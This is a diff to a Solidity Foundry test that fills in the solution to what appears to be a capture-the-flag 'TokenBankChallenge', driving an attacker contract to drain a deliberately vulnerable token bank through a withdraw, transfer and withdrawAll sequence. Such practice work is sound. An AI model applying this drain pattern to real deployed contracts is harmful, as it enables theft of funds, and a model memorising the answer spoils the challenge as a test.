@@ -14,8 +14,14 @@ contract TankBankTest is Test {
     function testExploit() public {
         tokenBankChallenge = new TokenBankChallenge(player);
         tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));
+        SimpleERC223Token token = tokenBankChallenge.token();
 
         // Put your solution here
+        vm.prank(player);
+        tokenBankChallenge.withdraw(1);
+        vm.prank(player);
+        token.transfer(address(tokenBankAttacker), 1);
+        tokenBankAttacker.withdrawAll();
 
         _checkSolved();
     }
